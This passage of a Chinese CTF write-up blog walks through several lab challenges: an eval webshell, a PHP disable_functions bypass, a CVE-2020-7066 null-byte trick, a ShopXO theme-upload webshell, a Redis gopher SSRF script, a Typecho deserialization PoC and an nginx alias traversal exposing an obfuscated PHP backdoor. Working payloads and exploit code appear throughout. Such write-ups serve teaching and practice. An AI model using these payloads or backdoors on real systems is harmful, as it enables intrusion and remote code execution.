class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> $_REQUEST;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">new</span> ClassName();</span><br></pre></td></tr></table></figure>\n\n<p>接受get或post形式传入的Ginkgo，并base64解码执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713092724.png\" alt=\"\"></p>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>那么构造一句话，由于这里是eval执行，相当于自动加php标签，所以只要构造<code>eval($_POST[&#39;a&#39;]); =&gt; ZXZhbCgkX1BPU1RbJ2EnXSk7</code>即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093632.png\" alt=\"\"></p>\n<p>用蚁剑连上，给了个readflag的脚本，php版本是7.3，考虑<a href=\"https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass\" target=\"_blank\" rel=\"noopener\">php7-gc-bypass</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093731.png\" alt=\"\"></p>\n<p>找个有上传权限的目录上传bypass脚本，红框内是执行的命令</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100351.png\" alt=\"\"></p>\n<p>tmp下上传</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100544.png\" alt=\"\"></p>\n<p>接着包含该文件即可bypass</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100714.png\" alt=\"\"></p>\n<p>把之前的命令改为执行readflag脚本即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100856.png\" alt=\"\"></p>\n<h3 id=\"cve版签到\"><a href=\"#cve版签到\" class=\"headerlink\" title=\"cve版签到\"></a>cve版签到</h3><p>给了提示是cve-2020-7066，搜集下信息</p>\n<blockquote>\n<p>PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的‘get_headers()’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。</p>\n</blockquote>\n<p> 参考：<a href=\"https://bugs.php.net/bug.php?id=79329\" target=\"_blank\" rel=\"noopener\">https://bugs.php.net/bug.php?id=79329</a></p>\n<p>即get_headers()函数在一个空字节后会被无提示地截断</p>\n<h4 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>打开靶机提示点击view ctfhub，跳转后url如下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713103821.png\" alt=\"\"></p>\n<p>参考文章中示例构造<code>http://127.0.0.1\\0www.ctfhub.com</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104006.png\" alt=\"\"></p>\n<p>由于是url传入，改为%00替代空字节</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104209.png\" alt=\"\"></p>\n<p>提示了必须以123结尾，改一下即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104528.png\" alt=\"\"></p>\n<h3 id=\"老八小超市儿\"><a href=\"#老八小超市儿\" class=\"headerlink\" title=\"老八小超市儿\"></a>老八小超市儿</h3><p>打开靶机是shopxo</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713105704.png\" alt=\"\"></p>\n<p>百度下有没有已知的漏洞</p>\n<p>找到一个后台getshell，参考文章：<a href=\"http://www.nctry.com/1660.html\" target=\"_blank\" rel=\"noopener\">http://www.nctry.com/1660.html</a></p>\n<h4 id=\"解题-2\"><a href=\"#解题-2\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>首先用默认账号密码登录后台，admin，shopxo</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110320.png\" alt=\"\"></p>\n<p>到应用商店下载默认主题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110501.png\" alt=\"\"></p>\n<p>往压缩包里加入shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110824.png\" alt=\"\"></p>\n<p>找到主题安装位置上传加入shell之后的压缩包</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111006.png\" alt=\"\"></p>\n<p>访问/public/static/index/default/oneword.php即可getshell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111334.png\" alt=\"\"></p>\n<p>用蚁剑连，根目录flag下提示在root</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111524.png\" alt=\"\"></p>\n<p>但root设置了权限不可读，注意到根目录下还有一个auto.sh，查看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111811.png\" alt=\"\"></p>\n<p>每隔一分钟执行一次makeflaghint.py，看下这个脚本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111929.png\" alt=\"\"></p>\n<p>获取当前时间并写入flag.hint，那么我们利用这个脚本的root权限读出root下的flag并写入到flag.hint即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113334.png\" alt=\"\"></p>\n<p>得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113443.png\" alt=\"\"></p>\n<h3 id=\"EZ三剑客-EzWeb\"><a href=\"#EZ三剑客-EzWeb\" class=\"headerlink\" title=\"EZ三剑客-EzWeb\"></a>EZ三剑客-EzWeb</h3><p>打开靶机只有一个提交框</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132552.png\" alt=\"\"></p>\n<p>源码处发现注释</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132729.png\" alt=\"\"></p>\n<p>提交访问返回类似ifconfig的结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">eth0      Link encap:Ethernet  HWaddr 02:42:ad:1f:54:0a  </span><br><span class=\"line\">          inet addr:173.31.84.10  Bcast:173.31.84.255  Mask:255.255.255.0</span><br><span class=\"line\">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class=\"line\">          RX packets:34 errors:0 dropped:0 overruns:0 frame:0</span><br><span class=\"line\">          TX packets:33 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class=\"line\">          collisions:0 txqueuelen:0 </span><br><span class=\"line\">          RX bytes:6058 (6.0 KB)  TX bytes:5729 (5.7 KB)</span><br><span class=\"line\"></span><br><span class=\"line\">lo        Link encap:Local Loopback  </span><br><span class=\"line\">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class=\"line\">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class=\"line\">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class=\"line\">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class=\"line\">          collisions:0 txqueuelen:1000 </span><br><span class=\"line\">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>\n\n<p>得到内网ip，访问看看</p>\n<p>会回显首页内容</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133619.png\" alt=\"\"></p>\n<p>看看内网里还有没有其他页面，burp爆破一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133903.png\" alt=\"\"></p>\n<p>扫到以下主机存活</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713134329.png\" alt=\"\"></p>\n<p>依次访问看看，其他没啥发现，访问11的时候提示扫它的端口</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713135357.png\" alt=\"\"></p>\n<p>太容易429了。。直接看的wp跑了一下6300-6400，发现开放了6379</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713141643.png\" alt=\"\"></p>\n<p>6379是redis的默认端口号</p>\n<h4 id=\"考点：Redis配合gopher协议进行SSRF\"><a href=\"#考点：Redis配合gopher协议进行SSRF\" class=\"headerlink\" title=\"考点：Redis配合gopher协议进行SSRF\"></a>考点：Redis配合gopher协议进行SSRF</h4><p>未授权访问Redis服务器</p>\n<p><a href=\"https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p>直接拿的脚本，php代码执行命令结果写入shell.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;</span><br><span class=\"line\">ip&#x3D;&quot;173.31.84.11&quot;#探测主机</span><br><span class=\"line\">port&#x3D;&quot;6379&quot;</span><br><span class=\"line\">shell&#x3D;&quot;\\n\\n&lt;?php system(\\&quot;cat &#x2F;flag\\&quot;);?&gt;\\n\\n&quot;</span><br><span class=\"line\">filename&#x3D;&quot;shell.php&quot;</span><br><span class=\"line\">path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;</span><br><span class=\"line\">passwd&#x3D;&quot;&quot;</span><br><span class=\"line\">cmd&#x3D;[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t ]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;</span><br><span class=\"line\">def redis_format(arr):</span><br><span class=\"line\">\tCRLF&#x3D;&quot;\\r\\n&quot;</span><br><span class=\"line\">\tredis_arr &#x3D; arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd&#x3D;&quot;&quot;</span><br><span class=\"line\">\tcmd+&#x3D;&quot;*&quot;+str(len(redis_arr))</span><br><span class=\"line\">\tfor x in redis_arr:</span><br><span class=\"line\">\t\tcmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+&#x3D;CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload +&#x3D; urllib.quote(redis_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>生成<code>gopher://173.31.84.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></p>\n<p>在输入框内输入提交，然而一直转。。。了好久，以为靶机问题中间还重启了下靶机，然后等不了手动停了，访问<a href=\"http://173.31.84.11/shell.php已经有了flag，嗯。。。神奇\" target=\"_blank\" rel=\"noopener\">http://173.31.84.11/shell.php已经有了flag，嗯。。。神奇</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713144707.png\" alt=\"\"></p>\n<h3 id=\"EZ三剑客-EzTypecho\"><a href=\"#EZ三剑客-EzTypecho\" class=\"headerlink\" title=\"EZ三剑客-EzTypecho\"></a>EZ三剑客-EzTypecho</h3><p>题目给了源码，打开靶机是Typecho博客的安装程序但不让安装</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713163648.png\" alt=\"\"></p>\n<p>在给出源码的changelog.txt里我们可以看到源码版本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713164514.png\" alt=\"\"></p>\n<p>百度下发现老版本有个install.php处反序列化漏洞。</p>\n<p>参考文章：<a href=\"https://blog.csdn.net/weixin_44005410/article/details/90385856\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/weixin_44005410/article/details/90385856</a></p>\n<h4 id=\"解题-3\"><a href=\"#解题-3\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>直接拿了参考文章师傅的poc生成payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$CMD = <span class=\"string\">'system(\"cat /flag\")'</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Typecho_Feed</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> RSS2 = <span class=\"string\">'RSS 2.0'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> ATOM1 = <span class=\"string\">'ATOM 1.0'</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">private</span> $_type;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> $_items;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//$this-&gt;_type = $this::RSS2;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;_type = <span class=\"keyword\">$this</span>::ATOM1;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;_items[<span class=\"number\">0</span>] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">                        <span class=\"string\">'category'</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"keyword\">new</span> Typecho_Request()),</span><br><span class=\"line\">                        <span class=\"string\">'author'</span> =&gt; <span class=\"keyword\">new</span> Typecho_Request(),</span><br><span class=\"line\">                );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Typecho_Request</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> $_params = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">private</span> $_filter = <span class=\"keyword\">array</span>();</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;_params[<span class=\"string\">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;_filter[<span class=\"number\">0</span>] = <span class=\"string\">'assert'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$exp = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">'adapter'</span> =&gt; <span class=\"keyword\">new</span> Typecho_Feed(),</span><br><span class=\"line\">        <span class=\"string\">'prefix'</span>  =&gt; <span class=\"string\">'typecho_'</span></span><br><span class=\"line\">);</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">echo</span> base64_encode(serialize($exp));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后按照文章中说的post传入payload即可，要注意一下保证referer是本站</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713165615.png\" alt=\"\"></p>\n","categories":["CTF"],"tags":["bypass","ssrf","Typecho","redis"]},{"title":"Web_php_wrong_nginx_config","url":"/2020/08/09/Web_php_wrong_nginx_config/","content":"<p>平台：<a href=\"https://adworld.xctf.org.cn/\" target=\"_blank\" rel=\"noopener\">https://adworld.xctf.org.cn/</a><br>打开是个登录框，但登录不了，扫目录发现robots.txt<br><img src=\"https://img-blog.csdnimg.cn/20200809211937256.png\" alt=\"在这里插入图片描述\"><br>hint.php<br><img src=\"https://img-blog.csdnimg.cn/20200809211959359.png\" alt=\"在这里插入图片描述\"><br>Hack.php弹窗需要登录但抓包发现cookie处有个isLogin=0，抓包修改为1进入页面，同样手动修改cookie处isLogin为1使得不再跳转回登录页面<br><img src=\"https://img-blog.csdnimg.cn/20200809212216395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>url可能存在文件包含<br><img src=\"https://img-blog.csdnimg.cn/20200809212254427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>构造<code>admin/admin.php?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext=</code>读取hint.php中的文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen <span class=\"number\">8080</span>; <span class=\"comment\">## listen for ipv4; this line is default and implied</span></span><br><span class=\"line\">    listen [::]:<span class=\"number\">8080</span>; <span class=\"comment\">## listen for ipv6</span></span><br><span class=\"line\"></span><br><span class=\"line\">    root /<span class=\"keyword\">var</span>/www/html;</span><br><span class=\"line\">    index index.php index.html index.htm;</span><br><span class=\"line\">    port_in_redirect off;</span><br><span class=\"line\">    server_name _;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Make site accessible from http://localhost/</span></span><br><span class=\"line\">    <span class=\"comment\">#server_name localhost;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># If block for setting the time for the logfile</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($time_iso8601 ~ <span class=\"string\">\"^(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)\"</span>) &#123;</span><br><span class=\"line\">       set $year $<span class=\"number\">1</span>;</span><br><span class=\"line\">       set $month $<span class=\"number\">2</span>;</span><br><span class=\"line\">       set $day $<span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span></span><br><span class=\"line\">    sendfile off;</span><br><span class=\"line\"></span><br><span class=\"line\">        set $http_x_forwarded_for_filt $http_x_forwarded_for;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($http_x_forwarded_for_filt ~ ([<span class=\"number\">0</span><span class=\"number\">-9</span>]+\\.[<span class=\"number\">0</span><span class=\"number\">-9</span>]+\\.[<span class=\"number\">0</span><span class=\"number\">-9</span>]+\\.)[<span class=\"number\">0</span><span class=\"number\">-9</span>]+) &#123;</span><br><span class=\"line\">                set $http_x_forwarded_for_filt $<span class=\"number\">1</span>???;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Add stdout logging</span></span><br><span class=\"line\"></span><br><span class=\"line\">    access_log /<span class=\"keyword\">var</span>/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;</span><br><span class=\"line\">    error_log /<span class=\"keyword\">var</span>/log/nginx/error.log info;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        <span class=\"comment\"># First attempt to serve request as file, then</span></span><br><span class=\"line\">        <span class=\"comment\"># as directory, then fall back to index.html</span></span><br><span class=\"line\">        try_files $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class=\"line\">        server_tokens off;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#error_page 404 /404.html;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># redirect server error pages to the static page /50x.html</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    error_page <span class=\"number\">500</span> <span class=\"number\">502</span> <span class=\"number\">503</span> <span class=\"number\">504</span> /<span class=\"number\">50</span>x.html;</span><br><span class=\"line\">    location = /<span class=\"number\">50</span>x.html &#123;</span><br><span class=\"line\">        root /usr/share/nginx/html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location ~ \\.php$ &#123;</span><br><span class=\"line\">        try_files $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class=\"line\">        fastcgi_split_path_info ^(.+\\.php)(/.+)$;</span><br><span class=\"line\">        fastcgi_pass unix:/<span class=\"keyword\">var</span>/run/php/php5<span class=\"number\">.6</span>-fpm.sock;</span><br><span class=\"line\">        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class=\"line\">        fastcgi_param SCRIPT_NAME $fastcgi_script_name;</span><br><span class=\"line\">        fastcgi_index index.php;</span><br><span class=\"line\">        <span class=\"keyword\">include</span> fastcgi_params;</span><br><span class=\"line\">        fastcgi_param REMOTE_ADDR $http_x_forwarded_for;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location ~ /\\. &#123;</span><br><span class=\"line\">            log_not_found off;</span><br><span class=\"line\">            deny all;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location /web-img &#123;</span><br><span class=\"line\">        alias /images/;</span><br><span class=\"line\">        autoindex on;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location ~* \\.(ini|docx|pcapng|doc)$ &#123;  </span><br><span class=\"line\">         deny all;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">include</span> /<span class=\"keyword\">var</span>/www/nginx[.]conf;</span><br><span class=\"line\">&#125;&lt;!DOCTYPE html&gt;</span><br></pre></td></tr></table></figure>\n<p>这里涉及到了知识盲区<br>nginx中root和alias都可以定义在location模块中，都是用来指定请求资源的真实路径。 但root中真实的路径是root指定的值加上location指定的值 ，而alias指定的路径是location的别名，不管location的值怎么写，资源的真实路径都是 alias 指定的路径 。<br>举个例子</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">location /blacknight/ &#123;</span><br><span class=\"line\">  root /data/<span class=\"keyword\">static</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假设我们访问：<a href=\"http://localhost:80/blacknight/test.html\" target=\"_blank\" rel=\"noopener\">http://localhost:80/blacknight/test.html</a><br>root的实际真实路径是：<a href=\"http://localhost:80/data/static/blacknight/test.html\" target=\"_blank\" rel=\"noopener\">http://localhost:80/data/static/blacknight/test.html</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">location /blacknight/ &#123;</span><br><span class=\"line\">  alias /data/<span class=\"keyword\">static</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假设我们访问：<a href=\"http://localhost:80/blacknight/test.html\" target=\"_blank\" rel=\"noopener\">http://localhost:80/blacknight/test.html</a><br>alias的实际真实路径是：<a href=\"http://localhost:80/data/static/test.html\" target=\"_blank\" rel=\"noopener\">http://localhost:80/data/static/test.html</a><br>这里我们访问web-img../直接可以访问到根目录<br><img src=\"https://img-blog.csdnimg.cn/20200809215257166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>在www目录下找到Hack.php.bak，应该是被混淆了<br><img src=\"https://img-blog.csdnimg.cn/20200809215422936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>输出$f得代码<br><img src=\"https://img-blog.csdnimg.cn/20200809215954109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>整理一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$kh=<span class=\"string\">\"42f7\"</span>;</span><br><span class=\"line\">$kf=<span class=\"string\">\"e9ac\"</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">x</span><span class=\"params\">($t,$k)</span> </span>&#123;</span><br><span class=\"line\">\t$c=strlen($k);</span><br><span class=\"line\">\t$l=strlen($t);</span><br><span class=\"line\">\t$o=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ($i=<span class=\"number\">0</span>;$i&lt;$l;) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> ($j=<span class=\"number\">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class=\"line\">\t\t\t$o.=$t &#123;</span><br><span class=\"line\">\t\t\t\t$i</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t^$k &#123;</span><br><span class=\"line\">\t\t\t\t$j</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $o;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$r=$_SERVER;</span><br><span class=\"line\">$rr=@$r[<span class=\"string\">\"HTTP_REFERER\"</span>];</span><br><span class=\"line\">$ra=@$r[<span class=\"string\">\"HTTP_ACCEPT_LANGUAGE\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class=\"line\">\t$u=parse_url($rr);</span><br><span class=\"line\">\tparse_str($u[<span class=\"string\">\"query\"</span>],$q);</span><br><span class=\"line\">\t$q=array_values($q);</span><br><span class=\"line\">\tpreg_match_all(<span class=\"string\">\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\"</span>,$ra,$m);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($q&amp;&amp;$m) &#123;</span><br><span class=\"line\">\t\t@session_start();</span><br><span class=\"line\">\t\t$s=&amp;$_SESSION;</span><br><span class=\"line\">\t\t$ss=<span class=\"string\">\"substr\"</span>;</span><br><span class=\"line\">\t\t$sl=<span class=\"string\">\"strtolower\"</span>;</span><br><span class=\"line\">\t\t$i=$m[<span class=\"number\">1</span>][<span class=\"number\">0</span>].$m[<span class=\"number\">1</span>][<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t$h=$sl($ss(md5($i.$kh),<span class=\"number\">0</span>,<span class=\"number\">3</span>));</span><br><span class=\"line\">\t\t$f=$sl($ss(md5($i.$kf),<span class=\"number\">0</span>,<span class=\"number\">3</span>));</span><br><span class=\"line\">\t\t$p=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> ($z=<span class=\"number\">1</span>;$z&lt;count($m[<span class=\"number\">1</span>]);$z++)$p.=$q[$m[<span class=\"number\">2</span>][$z]];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(strpos($p,$h)===<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t$s[$i]=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t\t\t$p=$ss($p,<span class=\"number\">3</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class=\"line\">\t\t\t$s[$i].=$p;</span><br><span class=\"line\">\t\t\t$e=strpos($s[$i],$f);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>($e) &#123;</span><br><span class=\"line\">\t\t\t\t$k=$kh.$kf;</span><br><span class=\"line\">\t\t\t\tob_start();</span><br><span class=\"line\">\t\t\t\t@<span class=\"keyword\">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class=\"keyword\">array</span>(<span 